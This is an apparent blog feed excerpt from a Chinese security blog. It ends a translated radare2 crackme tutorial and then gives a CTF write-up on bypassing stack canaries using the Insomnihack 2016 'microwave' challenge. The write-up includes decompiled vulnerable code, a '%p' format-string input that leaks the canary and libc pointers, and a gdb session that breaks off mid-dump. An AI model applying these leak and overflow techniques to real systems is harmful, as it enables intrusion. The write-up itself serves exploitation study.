7444</span><br><span class="line">Process with PID 7575 started…</span><br><span class="line">File dbg:///home/remnux/Desktop/tutorials/megabeets_0x1 Zrtnorrgf reopened in read-write mode</span><br><span class="line">= attach 7575 7575</span><br><span class="line">Assuming filepath /home/remnux/Desktop/tutorials/megabeets_0x1</span><br><span class="line"><span class="meta">[0xf7749be9]&gt;</span> dc</span><br><span class="line">Selecting and continuing: 7575.:: Megabeets ::.</span><br><span class="line">Think you can make it?</span><br><span class="line">Success!PTRACE_EVENT_EXIT pid=7575, status=0x0</span><br></pre></td></tr></table></figure><p>我们收到了成功的提示，破解了这个Crackme。在成功破解之后，我们终于可以说这个程序就是将我们输入的第一个参数与<code>rot13(“Megabeets”)</code>进行了比较，也就是<code>Zrtnorrgf</code>。</p><p>你可以在<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%201%20-%20Simple%20crackme/megabeets_0x1.c" target="_blank" rel="noopener">这里</a>查看Crackme的完整源码。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><code>Radare2</code>之旅第一部分就告一段落了。我们只接触了<code>radare2</code>的表皮，仅仅了解了它最最基础的一些功能。在下一部分中，我们将会学习更多的关于<code>radare2</code>的功能，包括脚本处理、恶意软件分析和漏洞利用。我知道对于很多人来说一开始是很难的，不管是能否感受到<code>radare2</code>的强大之处，亦或是将你的以前的习惯放到一边而熟悉使用<code>radare2</code>。不管你是一个逆向工程师、一个CTF比赛选手或者只是一个安全爱好者，我敢保证将<code>radare2</code>收入你的工具箱绝对一个是明智的选择。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;翻译自&lt;a href=&quot;https://www.megabeets.net/a-journey-into-radare-2-part-1/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Megabeets&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
      <category term="translation" scheme="https://qianfei11.github.io/tags/translation/"/>
    
  </entry>
  
  <entry>
    <title>绕过ELF的安全防护机制Canary</title>
    <link href="https://qianfei11.github.io/2019/02/15/%E3%80%90%E6%9C%AA%E5%AE%8C%E6%88%90%E3%80%91%E7%BB%95%E8%BF%87ELF%E7%9A%84%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6Canary/"/>
    <id>https://qianfei11.github.io/2019/02/15/【未完成】绕过ELF的安全防护机制Canary/</id>
    <published>2019-02-15T08:21:43.000Z</published>
    <updated>2019-02-18T10:58:18.432Z</updated>
    
    <content type="html"><![CDATA[<p>入门canary。</p><a id="more"></a><h1 id="何为Canary"><a href="#何为Canary" class="headerlink" title="何为Canary"></a>何为Canary</h1><p>由于<code>stack overflow</code>而引发的攻击非常普遍也非常古老，相应地一种叫做<code>Canary</code>的技术很早就出现在<code>glibc</code>里，直到现在也作为系统安全的第一道防线存在。<code>Canary</code>的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。这个概念应用在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的canary值，栈帧销毁前测试该值是否死掉，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。<code>Canary</code>不管是实现还是设计思想都比较简单高效，就是插入一个值，在<code>stack overflow</code>发生的高危区域的尾部，当函数返回之时检测<code>Canary</code>的值是否经过了改变，以此来判断<code>stack/buffer overflow</code>是否发生。<code>Canary</code>与Windows下的<code>GS保护</code>都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了<code>linux</code>下保护机制的标配。</p><p>以32位程序为例。没开Canary时的栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+------------------+</span><br><span class="line">|    parameter     |</span><br><span class="line">+------------------+</span><br><span class="line">|    local var1    |</span><br><span class="line">+------------------+</span><br><span class="line">|    local var2    |</span><br><span class="line">+------------------+</span><br><span class="line">|       ebp        |</span><br><span class="line">+------------------+</span><br><span class="line">|    return addr   |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p>开启Canary后的栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------------------+</span><br><span class="line">|    parameter     |</span><br><span class="line">+------------------+</span><br><span class="line">|    local var1    |</span><br><span class="line">+------------------+</span><br><span class="line">|    local var2    |</span><br><span class="line">+------------------+</span><br><span class="line">|      canary      | &lt;- Random</span><br><span class="line">+------------------+</span><br><span class="line">|       ebp        |</span><br><span class="line">+------------------+</span><br><span class="line">|    return addr   |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p>在<code>EBP</code>之前增加了一个不可预测的随机值并在程序中，而且在程序结尾处会检测<code>Canary</code>是否被篡改。如果发生了缓冲区溢出覆盖了返回地址则肯定会覆盖<code>Canary</code>，这时程序会直接退出。只有泄漏了<code>Canary</code>，才能overflow后面的return address：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   0x804852b &lt;func+71&gt;:mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x804852e &lt;func+74&gt;:xor    eax,DWORD PTR gs:0x14</span><br><span class="line">=&gt; 0x8048535 &lt;func+81&gt;:je     0x804853c &lt;func+88&gt;</span><br><span class="line"> | 0x8048537 &lt;func+83&gt;:call   0x8048390 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> | 0x804853c &lt;func+88&gt;:leave</span><br><span class="line"> | 0x804853d &lt;func+89&gt;:ret</span><br><span class="line"> | 0x804853e &lt;main&gt;:lea    ecx,[esp+0x4]</span><br><span class="line"> |-&gt;   0x804853c &lt;func+88&gt;:leave  </span><br><span class="line">       0x804853d &lt;func+89&gt;:ret</span><br></pre></td></tr></table></figure><p>如果没有绕过<code>Canary</code>，就会<code>call</code>到glibc中的函数<code>__stack_chk_fail</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Canary绕过技术"><a href="#Canary绕过技术" class="headerlink" title="Canary绕过技术"></a><code>Canary</code>绕过技术</h1><h2 id="泄漏Canary"><a href="#泄漏Canary" class="headerlink" title="泄漏Canary"></a>泄漏<code>Canary</code></h2><p><code>Canary</code>设计为以字节<code>\x00</code>结尾，本意是为了保证<code>Canary</code>可以截断字符串。泄露栈中的<code>Canary</code>的思路是覆盖<code>Canary</code>的低字节，来打印出剩余的<code>Canary</code>部分。这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露<code>Canary</code>，之后再次溢出控制执行流程。如果存在<code>format string</code>那么还可以泄漏<code>Canary</code>。</p><h3 id="2016-insomnihack-microwave"><a href="#2016-insomnihack-microwave" class="headerlink" title="2016-insomnihack-microwave"></a>2016-insomnihack-microwave</h3><p><code>checksec</code>一下程序，64位elf，保护全开：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>拖进ida查看一下程序。程序大概上是连接tweeter账户，编辑内容，发布最喜爱食物：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> input; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x3E</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\n --------------------------------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" |     Welcome to the next generation of MicroWaves!    |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" |                         ***                          |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" | This stylish Microwave with Grill function, includes |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" |      a function that tweets your favourite food!     |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" |                         ***                          |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" --------------------------------------------------------"</span>);</span><br><span class="line">  fflush(<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      choice();</span><br><span class="line">      fwrite(<span class="string">"\n           [MicroWave]: "</span>, <span class="number">1u</span>LL, <span class="number">0x19</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">      fgets(&amp;input, <span class="number">3</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      <span class="keyword">if</span> ( input != <span class="string">'2'</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *((_WORD *)v3 + <span class="number">30</span>) == <span class="number">1</span> )</span><br><span class="line">        edit();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fwrite(<span class="string">"\n      First: please connect to your Twitter account!\n\n"</span>, <span class="number">1u</span>LL, <span class="number">0x37</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( input &lt;= <span class="string">'2'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( input == <span class="string">'1'</span> )                       <span class="comment">// choice 1</span></span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(<span class="string">"\n           Log in on Twitter:\n"</span>, <span class="number">1u</span>LL, <span class="number">0x1F</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">        fwrite(<span class="string">"           username: "</span>, <span class="number">1u</span>LL, <span class="number">0x15</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">        fflush(<span class="number">0L</span>L);</span><br><span class="line">        fgets(v3, <span class="number">40</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        fwrite(<span class="string">"           password: "</span>, <span class="number">1u</span>LL, <span class="number">0x15</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">        fflush(<span class="number">0L</span>L);</span><br><span class="line">        fgets(v3 + <span class="number">40</span>, <span class="number">20</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        connect(v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( input == <span class="string">'3'</span> )                    <span class="comment">// choice 3</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_WORD *)v3 + <span class="number">30</span>) == <span class="number">1</span> )</span><br><span class="line">        tweet();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fwrite(<span class="string">"\n      Hey Dude! This didn't work out!\n\n"</span>, <span class="number">1u</span>LL, <span class="number">0x28</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( input == <span class="string">'q'</span> )                    <span class="comment">// quit</span></span><br><span class="line">    &#123;</span><br><span class="line">      fwrite(<span class="string">"\n           Bye!\n\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>connect()</code>函数中，发现了一个需要过的check密码，同时还有用户名的输入存在<code>format string</code>，故这里可以泄漏出栈上的<code>Canary</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">connect</span><span class="params">(<span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> j; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  j = <span class="number">1L</span>L;</span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"\nChecking "</span>);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, (__int64)input);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Twitter account"</span>);</span><br><span class="line">  fflush(<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( j &lt; <span class="built_in">strlen</span>(input + <span class="number">40</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ++j;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'.'</span>);</span><br><span class="line">    fflush(<span class="number">0L</span>L);</span><br><span class="line">    usleep(<span class="number">0x186A0</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">  <span class="built_in">string</span> = password;</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(password);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_WORD *)input + <span class="number">30</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( input[i + <span class="number">40</span>] != <span class="built_in">string</span>[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_WORD *)input + <span class="number">30</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>edit()</code>函数中存在<code>buffer overflow</code>，读了很长一串字符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-418h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+408h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"\n           #&gt; "</span>);</span><br><span class="line">  fflush(<span class="number">0L</span>L);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v1, <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\n           Done."</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时通过调试可以找到栈上的某个值与libc的偏移，以用来计算base：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">assassinq@ubuntu ~/pwn/ctf-wiki/canary/2016-insomnihack-microwave$ gdb ./microwave</span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ./microwave...(no debugging symbols found)...done.</span><br><span class="line">assassinq&gt;&gt; set environment LD_LIBRARY_PATH=./libc.so.6</span><br><span class="line">assassinq&gt;&gt; r</span><br><span class="line">Starting program: /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave </span><br><span class="line"></span><br><span class="line"> --------------------------------------------------------</span><br><span class="line"> |     Welcome to the next generation of MicroWaves!    |</span><br><span class="line"> |                         ***                          |</span><br><span class="line"> | This stylish Microwave with Grill function, includes |</span><br><span class="line"> |      a function that tweets your favourite food!     |</span><br><span class="line"> |                         ***                          |</span><br><span class="line"> --------------------------------------------------------</span><br><span class="line">           ----------------------------------</span><br><span class="line">           |  1. Connect to Twitter account |</span><br><span class="line">           |  2. Edit your tweet            |</span><br><span class="line">           |  3. Grill &amp; Tweet your food    |</span><br><span class="line">           |  q. Exit                       |</span><br><span class="line">           ----------------------------------</span><br><span class="line"></span><br><span class="line">           [MicroWave]: 1</span><br><span class="line"></span><br><span class="line">           Log in on Twitter:</span><br><span class="line">           username: %p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">           password: n07_7h3_fl46</span><br><span class="line"></span><br><span class="line">Checking 0x7ffff7dd3780.0x7ffff7b042c0.0x7ffff7fd8700.0xa.(nil).0x82f154bf635c9900.0x7ffff7dd2708.0x7ffff7dd2710</span><br><span class="line">Twitter account</span><br><span class="line">............</span><br><span class="line">           ----------------------------------</span><br><span class="line">           |  1. Connect to Twitter account |</span><br><span class="line">           |  2. Edit your tweet            |</span><br><span class="line">           |  3. Grill &amp; Tweet your food    |</span><br><span class="line">           |  q. Exit                       |</span><br><span class="line">           ----------------------------------</span><br><span class="line"></span><br><span class="line">           [MicroWave]: ^C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0xfffffffffffffe00 </span><br><span class="line">RBX: 0x7ffff7dd18e0 --&gt; 0xfbad2288 </span><br><span class="line">RCX: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;:cmp    rax,0xfffffffffffff001)</span><br><span class="line">RDX: 0x400 </span><br><span class="line">RSI: 0x555555759060 (&quot;n07_7h3_fl46\np.%p.%p.%p\n&quot;)</span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x7ffff7dd2620 --&gt; 0xfbad2887 </span><br><span class="line">RSP: 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:cmp    rax,0x0)</span><br><span class="line">RIP: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;:cmp    rax,0xfffffffffffff001)</span><br><span class="line">R8 : 0x7ffff7dd3780 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7fd8700 (0x00007ffff7fd8700)</span><br><span class="line">R10: 0x7ffff7fd8700 (0x00007ffff7fd8700)</span><br><span class="line">R11: 0x246 </span><br><span class="line">R12: 0xa (&apos;\n&apos;)</span><br><span class="line">R13: 0x2 </span><br><span class="line">R14: 0x55555575906d (&quot;p.%p.%p.%p\n&quot;)</span><br><span class="line">R15: 0x7ffff7dd18e0 --&gt; 0xfbad2288</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff7b04257 &lt;read+7&gt;:jne    0x7ffff7b04269 &lt;read+25&gt;</span><br><span class="line">   0x7ffff7b04259 &lt;__read_nocancel&gt;:mov    eax,0x0</span><br><span class="line">   0x7ffff7b0425e &lt;__read_nocancel+5&gt;:syscall </span><br><span class="line">=&gt; 0x7ffff7b04260 &lt;__read_nocancel+7&gt;:cmp    rax,0xfffffffffffff001</span><br><span class="line">   0x7ffff7b04266 &lt;__read_nocancel+13&gt;:jae    0x7ffff7b04299 &lt;read+73&gt;</span><br><span class="line">   0x7ffff7b04268 &lt;__read_nocancel+15&gt;:ret    </span><br><span class="line">   0x7ffff7b04269 &lt;read+25&gt;:sub    rsp,0x8</span><br><span class="line">   0x7ffff7b0426d &lt;read+29&gt;:call   0x7ffff7b220d0 &lt;__libc_enable_asynccancel&gt;</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:cmp    rax,0x0)</span><br><span class="line">0008| 0x7fffffffda30 --&gt; 0x7ffff7dd26a3 --&gt; 0xdd3780000000000a </span><br><span class="line">0016| 0x7fffffffda38 --&gt; 0x7ffff7dd18e0 --&gt; 0xfbad2288 </span><br><span class="line">0024| 0x7fffffffda40 --&gt; 0x7fffffffdae0 --&gt; 0x7fffff000a31 </span><br><span class="line">0032| 0x7fffffffda48 --&gt; 0x7ffff7a8860e (&lt;__GI__IO_default_uflow+14&gt;:cmp    eax,0xffffffff)</span><br><span class="line">0040| 0x7fffffffda50 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffda58 --&gt; 0x7ffff7a7bc6a (&lt;__GI__IO_getline_info+170&gt;:cmp    eax,0xffffffff)</span><br><span class="line">0056| 0x7fffffffda60 --&gt; 0x19 </span><br><span 